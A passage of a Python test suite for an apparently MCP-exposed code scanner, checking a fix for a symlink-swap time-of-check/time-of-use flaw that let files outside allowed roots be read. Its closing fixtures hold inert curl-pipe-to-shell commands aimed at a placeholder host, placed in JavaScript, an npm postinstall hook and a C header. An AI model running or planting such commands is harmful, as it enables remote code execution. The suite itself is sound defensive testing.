"""LZ-03 (the external security report of Oct 27; CWE-367, time-of-check time-of-use): scan_files resolved a path,
checked it against the allowed roots, then read it by `os.stat(p)` and `_read_prefix(os.path.realpath(p))`, a
second resolution never checked; scan_directory and quality_gate walked the directory they had checked by its path.
Whoever could change the tree during the call could swap a link or a directory after the check and have a file or a
directory outside the roots scanned, its findings and metadata returned to the MCP client.

Now the path is resolved once (ToolContext.check_path: the root it is under, its real path) and the file is opened
beneath that root a directory at a time, no link followed (core._open_beneath: dir_fd, O_DIRECTORY | O_NOFOLLOW, the
file O_NOFOLLOW | O_NONBLOCK); its kind, size and bytes are the open fd's. A part of the path swapped after the check
makes the open fail: the file is not read (SC-TRUNCATED, the call incomplete), and nothing outside the roots is.
The directory tools open the directory so, and the project walk and every reader after it reach each folder and file
from its descriptor (core._Root): a folder or a file the walk found that is a link, a file or nothing when it is
opened is not read (SC-TRUNCATED at it, the call incomplete), and nothing outside the root is listed or read.

The swaps are made at a fixed point (after the check, after the walk lists the root, after the walk), as the report's
repro makes its swap after the stat. Only what follows the read (decoding, the rules) is stubbed where a test watches
what reached the scanner (scan_files); the directory tests run the real scanner and watch what is listed and read.
Fixtures are inert text files in temporary directories, written as bytes ("\\n", on Windows too); where links cannot
be made (Windows without the privilege) the tests skip.

Windows has no such anchored open (core._ANCHORED_OPEN: no dir_fd, no O_NOFOLLOW): a file is opened by its path, links
followed, and kept only when the final path of what was opened is under the root (core._open_verified), and a tree
is read by path, each folder checked so (core._Root). Where a test checks what the anchored open says, it checks what
Windows' says there: of a file that leads outside the root now (it is outside the root), of a folder (Windows will not
open one as a file: permission denied), of a path through a folder that is a file now (no such path: as a file gone).
Nothing is read in any of them."""

import contextlib
import os
import shutil
import stat
import tempfile
import unicodedata
import unittest
from unittest import mock

from lazaret.mcp import server
from lazaret.scanner import core as lazaret
from tests._folding_disk import apfs_fold, folding_disk, tells_names_apart

INSIDE = "x = 1\n"
MARKER = "OUTSIDE_ROOT_MARKER = 'read-across-the-boundary'\n"
#: what scan_files says of a file whose path leads outside the root now, where it is opened by its path and its
#: handle's final path checked (Windows: core._open_verified), not beneath the root a directory at a time
OPENED_OUTSIDE = "not read: the file opened is outside the allowed root: its path changed after it was checked"


def _write(folder, rel, text):
    """`rel` ('/'-separated) under `folder`, its text's bytes as they are (no "\\r\\n" on Windows)."""
    with open(os.path.join(folder, *rel.split("/")), "w", encoding="utf-8", newline="\n") as fh:
        fh.write(text)


def _changed(anchored):
    """What scan_files says of a file a part of whose path was swapped for a link to outside after the check: the
    anchored open's own words (`anchored`), else where its handle is (OPENED_OUTSIDE)."""
    return anchored if lazaret._ANCHORED_OPEN else OPENED_OUTSIDE


def _can_link():
    folder = tempfile.mkdtemp(prefix="lz-mcp-link-")
    try:
        os.symlink(os.path.join(folder, "t"), os.path.join(folder, "l"))
        return True
    except (OSError, NotImplementedError, AttributeError):
        return False
    finally:
        shutil.rmtree(folder, ignore_errors=True)


def _can_hard_link_a_link(folder):
    """Can a hard link to a symbolic link (not to what it leads to) be made in `folder`?"""
    probe = tempfile.mkdtemp(dir=folder)
    try:
        os.symlink("nowhere", os.path.join(probe, "ln"))
        os.link(os.path.join(probe, "ln"), os.path.join(probe, "hard"), follow_symlinks=False)
        return os.path.islink(os.path.join(probe, "hard"))
    except (OSError, NotImplementedError):
        return False
    finally:
        shutil.rmtree(probe, ignore_errors=True)


@unittest.skipUnless(_can_link(), "symbolic links cannot be made here")
class _Case(unittest.TestCase):
    """inside/ (the one allowed root) with a.py, and outside/ beside it with b.py and sub/c.py holding the marker."""

    def setUp(self):
        self.base = tempfile.mkdtemp(prefix="lz-mcp-race-")
        self.addCleanup(shutil.rmtree, self.base, True)
        self.inside, self.outside = os.path.join(self.base, "inside"), os.path.join(self.base, "outside")
        for folder in (self.inside, os.path.join(self.inside, "sub"), self.outside,
                       os.path.join(self.outside, "sub")):
            os.makedirs(folder)
        self.write(self.inside, "a.py", INSIDE)
        self.write(self.inside, "sub/c.py", INSIDE)
        self.write(self.outside, "b.py", MARKER)
        self.write(self.outside, "sub/c.py", MARKER)
        self.roots(self.inside)
        self.seen = []

    def write(self, folder, rel, text):
        _write(folder, rel, text)

    def roots(self, *roots):
        patch = mock.patch.dict(os.environ, {"LAZARET_MCP_ROOTS": os.pathsep.join(roots)})
        patch.start()
        self.addCleanup(patch.stop)

    @contextlib.contextmanager
    def watching(self):
        """What reaches the scanner, kept in `seen` (the decoding and the rules stubbed, as the report's repro does)."""
        def decode(p, data):
            self.seen.append(data.decode("utf-8"))
            return data.decode("utf-8"), []
        with mock.patch.object(server.lazaret, "decode_member", side_effect=decode), \
                mock.patch.object(server.lazaret, "disguised_binary", return_value=None), \
                mock.patch.object(server.lazaret, "scan_file", return_value=[]):
            yield

    @contextlib.contextmanager
    def swapped_after_the_check(self, swap, paths=1):
        """`swap` runs once the call's `paths` paths have been checked, before any is opened."""
        real = server.ToolContext.check_path
        calls = []

        def check(ctx, path):
            got = real(ctx, path)
            calls.append(path)
            if len(calls) == paths:
                swap()
            return got
        with mock.patch.object(server.ToolContext, "check_path", check):
            yield

    def scan(self, *paths):
        return server.tool_scan_files({"paths": list(paths)})

    def assertNotRead(self, out, path, text):
        entry = out["files"][path]
        self.assertEqual((entry.get("rule"), entry.get("sev")), ("SC-TRUNCATED", "CRITICAL"), entry)
        self.assertIn(text, entry["error"])
        self.assertTrue(out.get("incomplete"))
        self.assertIn("could not be read", out["incompleteReason"])
        self.assertNotIn(MARKER, self.seen, "the outside content reached the scanner")

    def link(self, target, at):
        os.symlink(target, at, target_is_directory=os.path.isdir(target))


class FileSwapTests(_Case):
    def test_the_reports_swap_reads_the_file_that_was_checked(self):
        # the report's repro: inside/link.py -> inside/a.py when checked, then -> outside/b.py. The path was resolved
        # once (to inside/a.py) and that is what is opened: never outside/b.py
        link = os.path.join(self.inside, "link.py")
        self.link(os.path.join(self.inside, "a.py"), link)

        def swap():
            os.unlink(link)
            self.link(os.path.join(self.outside, "b.py"), link)
        with self.watching(), self.swapped_after_the_check(swap):
            out = self.scan(link)
        self.assertEqual(self.seen, [INSIDE])
        self.assertEqual(out["files"][link], {"issueCount": 0, "issues": []})
        self.assertNotIn("incomplete", out)

    def test_the_reports_repro_as_written_reads_nothing_outside(self):
        # (its swap is made after the os.stat scan_files no longer calls: the content read is the checked file's)
        link = os.path.join(self.inside, "link.py")
        self.link(os.path.join(self.inside, "a.py"), link)
        real_stat = os.stat

        def swap_after_stat(path, *args, **kwargs):
            result = real_stat(path, *args, **kwargs)
            if os.fspath(path) == link:
                os.unlink(link)
                self.link(os.path.join(self.outside, "b.py"), link)
            return result
        with self.watching(), mock.patch.object(server.os, "stat", side_effect=swap_after_stat):
            self.scan(link)
        self.assertEqual(self.seen, [INSIDE])

    def test_the_checked_file_swapped_for_a_link_is_not_read(self):
        path = os.path.join(self.inside, "a.py")

        def swap():
            os.unlink(path)
            self.link(os.path.join(self.outside, "b.py"), path)
        with self.watching(), self.swapped_after_the_check(swap):
            out = self.scan(path)
        self.assertNotRead(out, path, _changed("it is a symbolic link now: it changed after the path was checked"))
        self.assertEqual(self.seen, [])

    def test_a_directory_on_the_path_swapped_for_a_link_is_not_read(self):
        path = os.path.join(self.inside, "sub", "c.py")
        sub = os.path.join(self.inside, "sub")

        def swap():
            os.rename(sub, sub + ".old")
            self.link(os.path.join(self.outside, "sub"), sub)
        with self.watching(), self.swapped_after_the_check(swap):
            out = self.scan(path)
        self.assertNotRead(out, path, _changed("sub on its path is a symbolic link or no directory now"))
        self.assertEqual(self.seen, [])

    def test_a_directory_on_the_path_swapped_for_a_file_is_not_read(self):
        path = os.path.join(self.inside, "sub", "c.py")
        sub = os.path.join(self.inside, "sub")

        def swap():
            os.rename(sub, sub + ".old")
            self.write(self.inside, "sub", MARKER)
        with self.watching(), self.swapped_after_the_check(swap):
            out = self.scan(path)
        if lazaret._ANCHORED_OPEN:
            self.assertNotRead(out, path, "is a symbolic link or no directory now")
        else:       # (opened by its path, which names nothing now, sub being a file: as a file gone after the check)
            self.assertEqual(out["files"][path], {"error": "File not found"})
        self.assertEqual(self.seen, [])

    @unittest.skipUnless(lazaret._ANCHORED_OPEN, "the anchored open walks down the path; where a file is opened by its "
                                                 "path (Windows), what it reaches is checked: WithoutAnAnchoredOpen*")
    def test_a_swap_while_the_path_is_walked_is_not_read(self):
        # the swap made between two opens of the walk: after the root's, before sub's
        path = os.path.join(self.inside, "sub", "c.py")
        sub = os.path.join(self.inside, "sub")
        root = os.path.normcase(os.path.realpath(self.inside))
        real_open = os.open
        done = []

        def opening(name, flags, mode=0o777, *, dir_fd=None):
            fd = real_open(name, flags, mode, dir_fd=dir_fd)
            if not done and dir_fd is None and os.fspath(name) == root:
                done.append(True)
                os.rename(sub, sub + ".old")
                self.link(os.path.join(self.outside, "sub"), sub)
            return fd
        with self.watching(), mock.patch.object(lazaret.os, "open", side_effect=opening):
            out = self.scan(path)
        self.assertTrue(done, "the walk opened the root")
        self.assertNotRead(out, path, "sub on its path is a symbolic link or no directory now")

    def test_a_link_that_leads_outside_is_refused_at_the_check_as_before(self):
        escape = os.path.join(self.inside, "escape.py")
        self.link(os.path.join(self.outside, "b.py"), escape)
        with self.watching(), self.assertRaisesRegex(ValueError, "outside the allowed roots"):
            self.scan(escape)
        self.assertEqual(self.seen, [])

    def test_one_file_not_read_does_not_hide_the_others(self):
        good, bad = os.path.join(self.inside, "sub", "c.py"), os.path.join(self.inside, "a.py")

        def swap():
            os.unlink(bad)
            self.link(os.path.join(self.outside, "b.py"), bad)
        with self.watching(), self.swapped_after_the_check(swap, paths=2):
            out = self.scan(good, bad)
        self.assertEqual(out["files"][good], {"issueCount": 0, "issues": []})
        self.assertNotRead(out, bad, _changed("symbolic link now"))
        self.assertIn("1 of 2 file(s) could not be read", out["incompleteReason"])


class LegitimateLinkTests(_Case):
    def test_a_link_inside_the_root_to_a_file_inside_it_is_scanned(self):
        link = os.path.join(self.inside, "link.py")
        self.link(os.path.join(self.inside, "a.py"), link)
        with self.watching():
            out = self.scan(link)
        self.assertEqual((self.seen, out["files"][link]), ([INSIDE], {"issueCount": 0, "issues": []}))
        self.assertNotIn("incomplete", out)

    def test_a_path_through_a_linked_directory_inside_the_root_is_scanned(self):
        linked = os.path.join(self.inside, "linked")
        self.link(os.path.join(self.inside, "sub"), linked)
        path = os.path.join(linked, "c.py")
        with self.watching():
            out = self.scan(path)
        self.assertEqual((self.seen, out["files"][path]), ([INSIDE], {"issueCount": 0, "issues": []}))

    def test_a_root_reached_through_a_link_works(self):
        # (macOS's /tmp is /private/tmp: a root and a path named through a link resolve to the real folder)
        alias = os.path.join(self.base, "alias")
        self.link(self.inside, alias)
        self.roots(alias)
        for path in (os.path.join(alias, "a.py"), os.path.join(self.inside, "a.py"),
                     os.path.join(alias, "sub", "c.py")):
            with self.subTest(path=path), self.watching():
                self.seen.clear()
                out = self.scan(path)
                self.assertEqual((self.seen, out["files"][path]), ([INSIDE], {"issueCount": 0, "issues": []}))

    def test_the_special_files_say_what_they_are(self):
        folder = os.path.join(self.inside, "pkg.py")
        os.mkdir(folder)
        out = self.scan(folder)
        # (Windows will not open a folder as a file: permission denied, which is what it says there)
        self.assertNotRead(out, folder, "it is a directory, not a regular file" if lazaret._ANCHORED_OPEN
                           else "cannot read the file (Permission denied)")
        if hasattr(os, "mkfifo"):
            fifo = os.path.join(self.inside, "pipe.py")
            os.mkfifo(fifo)
            self.assertNotRead(self.scan(fifo), fifo, "a named pipe (FIFO)")
        gone = os.path.join(self.inside, "gone.py")
        self.assertEqual(self.scan(gone)["files"][gone], {"error": "File not found"})

    def test_its_size_is_the_open_files(self):
        # (its kind and size are the open fd's, read before a byte of it is)
        path = os.path.join(self.inside, "a.py")
        with mock.patch.object(lazaret, "SOURCE_SIZE_CAP", 3), self.watching():
            out = self.scan(path)
        self.assertIn("exceeds the 3-byte file limit", out["files"][path]["error"])
        self.assertEqual(self.seen, [])


class WithoutAnAnchoredOpenTests(_Case):
    """Where a file cannot be opened beneath a directory's fd (Windows: no dir_fd, no O_NOFOLLOW), it is opened and
    kept only when the final path of what was opened is under the root (Windows' GetFinalPathNameByHandleW; here
    /proc/self/fd or F_GETPATH stands in for it)."""

    def setUp(self):
        super().setUp()
        probe = os.open(os.path.join(self.inside, "a.py"), os.O_RDONLY)
        try:
            if lazaret._opened_path(probe) is None:
                self.skipTest("this platform cannot say where an opened file is")
        finally:
            os.close(probe)
        patch = mock.patch.object(lazaret, "_ANCHORED_OPEN", False)
        patch.start()
        self.addCleanup(patch.stop)

    def test_a_swap_that_leads_outside_is_not_read(self):
        for target, rel in ((os.path.join(self.outside, "b.py"), "a.py"), (os.path.join(self.outside, "sub"), "sub")):
            with self.subTest(rel=rel):
                self.seen.clear()
                at = os.path.join(self.inside, rel)
                path = os.path.join(self.inside, "a.py" if rel == "a.py" else os.path.join("sub", "c.py"))

                def swap():
                    os.rename(at, at + ".old")
                    self.link(target, at)
                with self.watching(), self.swapped_after_the_check(swap):
                    out = self.scan(path)
                self.assertNotRead(out, path, "changed after")

    def test_legitimate_links_are_scanned(self):
        link, linked = os.path.join(self.inside, "link.py"), os.path.join(self.inside, "linked")
        self.link(os.path.join(self.inside, "a.py"), link)
        self.link(os.path.join(self.inside, "sub"), linked)
        with self.watching():
            out = self.scan(link, os.path.join(linked, "c.py"))
        self.assertEqual(self.seen, [INSIDE, INSIDE])
        self.assertNotIn("incomplete", out)

    def test_a_platform_that_cannot_say_where_the_file_is_reads_nothing(self):
        path = os.path.join(self.inside, "a.py")
        with self.watching(), mock.patch.object(lazaret, "_opened_path", return_value=None):
            out = self.scan(path)
        self.assertNotRead(out, path, "cannot tell where the file opened is")
        self.assertEqual(self.seen, [])


TOOLS = (("scan_directory", server.tool_scan_directory), ("quality_gate", server.tool_quality_gate))
CHANGED = "changed while the tree was read"


@unittest.skipUnless(_can_link(), "symbolic links cannot be made here")
class _DirectoryCase(unittest.TestCase):
    """A fresh tree per call: inside/ (the allowed root, scanned) with a.py and sub/c.py; outside/ beside it with b.py,
    sub/c.py and sub/outside_only.py, all holding the marker. What the call lists and reads under any tree is kept
    (`listed`, `reads`): every byte the walk and its readers read goes through core._read_fd, and every listing
    through core._Root.listdir."""

    def setUp(self):
        self.base = tempfile.mkdtemp(prefix="lz-mcp-dir-race-")
        self.addCleanup(shutil.rmtree, self.base, True)
        self.listed, self.reads = [], []

    def tree(self):
        base = tempfile.mkdtemp(dir=self.base)
        inside, outside = os.path.join(base, "inside"), os.path.join(base, "outside")
        for folder in (inside, os.path.join(inside, "sub"), outside, os.path.join(outside, "sub")):
            os.makedirs(folder)
        for folder, rel, text in ((inside, "a.py", INSIDE), (inside, "sub/c.py", INSIDE), (outside, "b.py", MARKER),
                                  (outside, "sub/c.py", MARKER), (outside, "sub/outside_only.py", MARKER)):
            self.write(folder, rel, text)
        self.roots(inside)
        self.listed.clear()
        self.reads.clear()
        return inside, outside

    def write(self, folder, rel, text):
        _write(folder, rel, text)

    def roots(self, *roots):
        patch = mock.patch.dict(os.environ, {"LAZARET_MCP_ROOTS": os.pathsep.join(roots)})
        patch.start()
        self.addCleanup(patch.stop)

    def link(self, target, at):
        os.symlink(target, at, target_is_directory=os.path.isdir(target))

    def swap(self, at, target):
        """`at` (a folder or a file) moved aside and a link to `target` put in its place."""
        os.rename(at, at + ".old")
        self.link(target, at)

    @contextlib.contextmanager
    def watching(self, swap=None, when="listed", after=()):
        """What is listed and read, kept; `swap` runs once: when the walk (not the budget's count before it) has
        listed the folder `after` (names below the root), before it opens anything in it ("listed"), or when the walk
        is done, before the readers after it ("walked")."""
        real_read, real_listdir, real_walk = lazaret._read_fd, lazaret._Root.listdir, lazaret._walk
        state = {"walking": False, "swapped": False}

        def swap_now(tree):
            state["swapped"] = True
            swap()

        def read(fd, limit, st=None):
            data = real_read(fd, limit, st)
            self.reads.append(data)
            return data

        def listdir(tree, parts=()):
            got = real_listdir(tree, parts)
            self.listed.extend(e.name for e in got)
            if swap and when == "listed" and state["walking"] and not state["swapped"] and tuple(parts) == after:
                swap_now(tree)
            return got

        def walk(tree, *args, **kwargs):
            state["walking"] = True
            got = real_walk(tree, *args, **kwargs)
            if swap and when == "walked" and not state["swapped"]:
                swap_now(tree)
            return got
        with mock.patch.object(lazaret, "_read_fd", side_effect=read), \
                mock.patch.object(lazaret._Root, "listdir", listdir), mock.patch.object(lazaret, "_walk", walk):
            yield state
        if swap:
            self.assertTrue(state["swapped"], "the swap was made")

    def assertNothingOutside(self):
        self.assertFalse([d for d in self.reads if MARKER.encode() in d], "a file outside the root was read")
        self.assertNotIn("outside_only.py", self.listed, "a folder outside the root was listed")

    def assertNotRead(self, name, out, rel, why=CHANGED):
        self.assertEqual(out["qualityGate"], "FAILED")
        self.assertTrue(out.get("incomplete"), out)
        if name == "scan_directory":
            found = [i for i in out["issues"] if i["file"] == rel and i["rule"] == "SC-TRUNCATED"]
            self.assertTrue(found and all(i["sev"] == "CRITICAL" for i in found), out["issues"])
            self.assertTrue(any(why in i["msg"] for i in found), found)
            self.assertFalse([i for i in out["issues"] if i["file"].startswith(rel + os.sep)], out["issues"])
        self.assertNothingOutside()


class DirectorySwapTests(_DirectoryCase):
    def test_a_folder_swapped_for_a_link_during_the_walk_is_not_read(self):
        for name, tool in TOOLS:
            with self.subTest(tool=name):
                inside, outside = self.tree()
                with self.watching(lambda: self.swap(os.path.join(inside, "sub"), os.path.join(outside, "sub"))):
                    out = tool({"path": inside})
                self.assertNotRead(name, out, "sub")
                self.assertIn("1 part of the tree changed while it was read and was not read", out["incompleteReason"])
                self.assertIn(INSIDE.encode(), self.reads)                  # (a.py: the rest is scanned)

    def test_a_file_swapped_for_a_link_during_the_walk_is_not_read(self):
        for name, tool in TOOLS:
            with self.subTest(tool=name):
                inside, outside = self.tree()
                with self.watching(lambda: self.swap(os.path.join(inside, "a.py"), os.path.join(outside, "b.py"))):
                    out = tool({"path": inside})
                self.assertNotRead(name, out, "a.py")
                self.assertIn(INSIDE.encode(), self.reads)                  # (sub/c.py)

    def test_a_folder_swapped_for_a_file_during_the_walk_is_not_read(self):
        for name, tool in TOOLS:
            with self.subTest(tool=name):
                inside, _outside = self.tree()
                sub = os.path.join(inside, "sub")

                def swap():
                    os.rename(sub, sub + ".old")
                    self.write(inside, "sub", MARKER)
                with self.watching(swap):
                    out = tool({"path": inside})
                self.assertNotRead(name, out, "sub")

    def test_a_folder_a_hook_reads_from_swapped_after_the_walk_is_not_read(self):
        # the readers after the walk (here the project's install hook's: the file it runs) read from the root's
        # descriptor too
        for name, tool in TOOLS:
            with self.subTest(tool=name):
                inside, outside = self.tree()
                self.write(inside, "package.json", '{"name": "x", "scripts": {"postinstall": "node lib/run.dat"}}\n')
                for folder in (inside, outside):
                    os.makedirs(os.path.join(folder, "lib"))
                self.write(inside, "lib/run.dat", "console.log(1)\n")
                self.write(outside, "lib/run.dat", MARKER)
                with self.watching(lambda: self.swap(os.path.join(inside, "lib"), os.path.join(outside, "lib")),
                                   when="walked"):
                    out = tool({"path": inside})
                # (the hook's reader finds lib/, a folder the walk found, a link now: lib/ is reported, nothing in
                # it read)
                self.assertNotRead(name, out, "lib")

    def test_the_directory_swapped_after_the_check_is_not_scanned(self):
        for name, tool in TOOLS:
            for target in ("proj", ""):
                with self.subTest(tool=name, target=target or "the root itself"):
                    inside, outside = self.tree()
                    os.makedirs(os.path.join(inside, "proj"))
                    self.write(inside, "proj/app.py", INSIDE)
                    path = os.path.join(inside, target) if target else inside
                    real = server.ToolContext.check_path

                    def check(ctx, p, path=path):
                        got = real(ctx, p)
                        self.swap(path, outside)
                        return got
                    with self.watching(), mock.patch.object(server.ToolContext, "check_path", check):
                        out = tool({"path": path})
                    self.assertEqual(out["qualityGate"], "FAILED")
                    self.assertTrue(out["incomplete"])
                    self.assertIn("it changed after it was checked", out["incompleteReason"])
                    if name == "scan_directory":
                        self.assertEqual([(i["rule"], i["file"]) for i in out["issues"]], [("SC-TRUNCATED", ".")])
                    self.assertEqual((self.reads, self.listed), ([], []))
                    os.unlink(path)
                    os.rename(path + ".old", path)

    def test_the_count_before_the_walk_reads_beneath_the_root_too(self):
        # (the budget's count, _preflight, lists from the same descriptor: a folder swapped before it is not counted)
        inside, outside = self.tree()
        real = server.ToolContext.check_path

        def check(ctx, p):
            got = real(ctx, p)
            self.swap(os.path.join(inside, "sub"), os.path.join(outside, "sub"))
            return got
        with self.watching(), mock.patch.object(server.ToolContext, "check_path", check):
            out = server.tool_scan_directory({"path": inside})
        self.assertNotIn("incomplete", out)              # (a link found by the walk: Q-SYMLINK, as always)
        self.assertEqual([i["rule"] for i in out["issues"] if i["file"] == "sub"], ["Q-SYMLINK"])
        self.assertNothingOutside()


class DirectoryLinkTests(_DirectoryCase):
    def test_links_inside_the_root_are_reported_and_not_followed_as_before(self):
        for name, tool in TOOLS:
            with self.subTest(tool=name):
                inside, outside = self.tree()
                for at, target in (("linked", os.path.join(inside, "sub")), ("link.py", os.path.join(inside, "a.py")),
                                   ("out", os.path.join(outside, "sub")), ("out.py", os.path.join(outside, "b.py"))):
                    self.link(target, os.path.join(inside, at))
                with self.watching():
                    out = tool({"path": inside})
                self.assertNotIn("incomplete", out)
                if name == "scan_directory":
                    self.assertEqual(sorted(i["file"] for i in out["issues"] if i["rule"] == "Q-SYMLINK"),
                                     ["link.py", "linked", "out", "out.py"])
                    self.assertFalse([i for i in out["issues"] if i["rule"] == "SC-TRUNCATED"])
                self.assertNothingOutside()
                self.assertEqual(self.reads.count(INSIDE.encode()), 2)    # (a.py and sub/c.py, once each)

    def test_a_root_reached_through_a_link_works(self):
        # (macOS's /tmp is /private/tmp: a root and a path named through a link resolve to the real folder)
        for name, tool in TOOLS:
            inside, _outside = self.tree()
            alias = os.path.join(os.path.dirname(inside), "alias")
            self.link(inside, alias)
            self.roots(alias)
            for path in (alias, inside, os.path.join(alias, "sub")):
                with self.subTest(tool=name, path=path), self.watching():
                    self.reads.clear()
                    out = tool({"path": path})
                    self.assertNotIn("incomplete", out)
                    self.assertIn(INSIDE.encode(), self.reads)

    def test_a_directory_through_a_linked_folder_inside_the_root_is_scanned(self):
        inside, _outside = self.tree()
        linked = os.path.join(inside, "linked")
        self.link(os.path.join(inside, "sub"), linked)
        with self.watching():
            out = server.tool_scan_directory({"path": linked})
        self.assertNotIn("incomplete", out)
        self.assertEqual(self.reads, [INSIDE.encode()])


class DirectoryWithoutAnAnchoredOpenTests(_DirectoryCase):
    """Where nothing can be opened beneath a folder's descriptor (Windows: no dir_fd, no scandir of a descriptor, no
    O_NOFOLLOW), the tree is read by path and checked: every folder is lstat'ed and listed only when its final path is
    under the root, every file kept only when the final path of what was opened is (Windows' CreateFileW and
    GetFinalPathNameByHandleW; here /proc/self/fd or F_GETPATH stands in for them, and O_NOFOLLOW is taken away)."""

    def setUp(self):
        super().setUp()
        # (as the walk asks it: Windows opens a folder with CreateFileW, as os.open cannot)
        if lazaret._folder_final_path(self.base) is None:
            self.skipTest("this platform cannot say where an opened folder is")
        for patch in (mock.patch.object(lazaret, "_ANCHORED_OPEN", False),
                      mock.patch.object(lazaret, "_OPEN_FLAGS", lazaret._OPEN_FLAGS & ~getattr(os, "O_NOFOLLOW", 0))):
            patch.start()
            self.addCleanup(patch.stop)

    def test_swaps_during_the_walk_are_not_read(self):
        for name, tool in TOOLS:
            for rel, target in (("sub", "sub"), ("a.py", "b.py")):
                with self.subTest(tool=name, swapped=rel):
                    inside, outside = self.tree()
                    with self.watching(lambda: self.swap(os.path.join(inside, rel), os.path.join(outside, target))):
                        out = tool({"path": inside})
                    self.assertNotRead(name, out, rel)

    def test_a_folder_swapped_behind_one_already_listed_is_not_read(self):
        # (the swap made once the walk has listed sub, before its files are read: each file's folder is checked again
        # when the file is read, and the file's own final path)
        inside, outside = self.tree()
        with self.watching(lambda: self.swap(os.path.join(inside, "sub"), os.path.join(outside, "sub")),
                           after=("sub",)):
            out = server.tool_scan_directory({"path": inside})
        self.assertNotRead("scan_directory", out, os.path.join("sub", "c.py"))

    def test_the_directory_swapped_after_the_check_is_not_scanned(self):
        inside, outside = self.tree()
        os.makedirs(os.path.join(inside, "proj"))
        path = os.path.join(inside, "proj")
        real = server.ToolContext.check_path

        def check(ctx, p):
            got = real(ctx, p)
            self.swap(path, outside)
            return got
        with self.watching(), mock.patch.object(server.ToolContext, "check_path", check):
            out = server.tool_scan_directory({"path": path})
        self.assertIn("it changed after it was checked", out["incompleteReason"])
        self.assertEqual((self.reads, self.listed), ([], []))

    def test_links_and_a_linked_root_are_as_before(self):
        inside, outside = self.tree()
        self.link(os.path.join(outside, "sub"), os.path.join(inside, "out"))
        self.link(os.path.join(inside, "a.py"), os.path.join(inside, "link.py"))
        alias = os.path.join(os.path.dirname(inside), "alias")
        self.link(inside, alias)
        self.roots(alias)
        with self.watching():
            out = server.tool_scan_directory({"path": alias})
        self.assertNotIn("incomplete", out)
        self.assertEqual(sorted(i["file"] for i in out["issues"] if i["rule"] == "Q-SYMLINK"), ["link.py", "out"])
        self.assertNothingOutside()

    def test_a_folder_past_max_path_is_truncated_where_the_system_will_not_take_its_path(self):
        # (LZ-03's review of PR #17, L7: Windows without its long paths (LongPathsEnabled 0, its default) takes no plain
        # path of 260 characters or more, and the tree is read by plain paths there: a folder past that is not read,
        # SC-TRUNCATED at it, the result incomplete, as a folder nested too deep is. Where the system takes it (a
        # runner with long paths, Linux), the walk reads it; that system is made one that will not here, refusing
        # such a path as Win32 does, ERROR_PATH_NOT_FOUND)
        inside, _outside = self.tree()
        chain, at = [], inside
        while len(at) < _MAX_PATH + 40:
            chain.append("d" * 40)
            at = os.path.join(at, chain[-1])
            os.mkdir(_plain_or_extended(at))
        with open(_plain_or_extended(os.path.join(at, "deep.js")), "wb") as fh:
            fh.write(RISKY_JS.encode())
        self.addCleanup(_remove_chain, inside, chain)
        for limited in (False, True):
            with self.subTest(max_path=limited):
                self.reads.clear()
                self.listed.clear()
                with self.watching(), (_without_long_paths() if limited else contextlib.nullcontext()):
                    out = server.tool_scan_directory({"path": inside, "max_issues": 500})
                deep = os.path.join(*chain, "deep.js")
                truncated = [i["file"] for i in out["issues"] if i["rule"] == "SC-TRUNCATED"]
                if not limited and _takes_long_paths(at):
                    self.assertFalse(out.get("incomplete"), out)
                    self.assertEqual(truncated, [])
                    self.assertIn(RISKY_JS.encode(), self.reads)
                    continue
                self.assertEqual(out["qualityGate"], "FAILED")
                self.assertTrue(out.get("incomplete"), out)
                self.assertEqual(len(truncated), 1, out["issues"])
                self.assertTrue(deep == truncated[0] or deep.startswith(truncated[0] + os.sep), truncated)
                self.assertGreater(len(os.path.join(inside, truncated[0])), _MAX_PATH - 50, truncated)
                self.assertNotIn(RISKY_JS.encode(), self.reads)
                self.assertNothingOutside()


#: Win32's MAX_PATH: a plain path (not \\?\) of this many characters or more is not taken where long paths are off
_MAX_PATH = 260


def _plain_or_extended(path):
    """`path` as it can be made whatever the system's long paths: on Windows, absolute with the extended-length prefix
    (\\\\?\\); elsewhere as it is."""
    if os.name != "nt":
        return path
    path = os.path.abspath(path)
    return path if path.startswith("\\\\?\\") else "\\\\?\\" + path


def _takes_long_paths(path):
    try:
        os.lstat(path)
        return True
    except OSError:
        return False


def _remove_chain(inside, chain):
    """inside/<chain…>/deep.js and the chain's folders, removed by extended-length paths on Windows (shutil.rmtree's
    plain ones may be too long there)."""
    folders = [os.path.join(inside, *chain[:k]) for k in range(1, len(chain) + 1)]
    with contextlib.suppress(OSError):
        os.unlink(_plain_or_extended(os.path.join(folders[-1], "deep.js")))
    for folder in reversed(folders):
        with contextlib.suppress(OSError):
            os.rmdir(_plain_or_extended(folder))


@contextlib.contextmanager
def _without_long_paths():
    """The path calls the walk makes refuse a plain path of MAX_PATH characters or more (FileNotFoundError), as
    Windows' do where long paths are off; an extended-length one (\\\\?\\) is taken."""
    def refusing(real):
        def call(path, *args, **kwargs):
            if isinstance(path, str) and len(path) >= _MAX_PATH and not path.startswith("\\\\?\\"):
                raise FileNotFoundError(2, "The system cannot find the path specified", path)
            return real(path, *args, **kwargs)
        return call
    with contextlib.ExitStack() as stack:
        for name in ("lstat", "stat", "open", "scandir", "readlink"):
            stack.enter_context(mock.patch.object(os, name, refusing(getattr(os, name))))
        stack.enter_context(mock.patch.object(lazaret, "_folder_final_path", refusing(lazaret._folder_final_path)))
        yield


# ---------------------------------------------------------------- LZ-03's review
RISKY_JS = "require('child_process').execSync('curl -s https://198.51.100.7/p.sh | sh');\n"    # (inert: never run)
HOOK_PKG = '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node lib/run.dat"}}\n'
GATE_PKG = '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "curl -s https://198.51.100.7/p.sh | sh"}}\n'
GO_VENDOR = {"go.mod": "module example.com/p\n\ngo 1.21\n", "main.go": "package main\n\nfunc main() {}\n",
             "vendor/modules.txt": "# example.com/v v1.0.0\n## explicit\nexample.com/v\n",
             "vendor/example.com/v/v.go": "package v\n\n// #include \"v.h\"\nimport \"C\"\n",
             "vendor/example.com/v/v.h": "int v(void) { return system(\"curl -s https://198.51.100.7/p.sh | sh\"); }\n"}


class _SwapCase(_DirectoryCase):
    SWAPS = ("link", "folder", "other file", "gone")

    def put(self, inside, files):
        for rel, text in files.items():
            os.makedirs(os.path.dirname(os.path.join(inside, *rel.split("/"))), exist_ok=True)
            self.write(inside, rel, text)

    def change(self, inside, outside, rel, how):
        """`rel` under inside/ swapped: for a link to its twin outside, a folder, another file (another inode, the same
        text), or nothing."""
        at = os.path.join(inside, *rel.split("/"))
        if how == "link":
            twin = os.path.join(outside, *rel.split("/"))
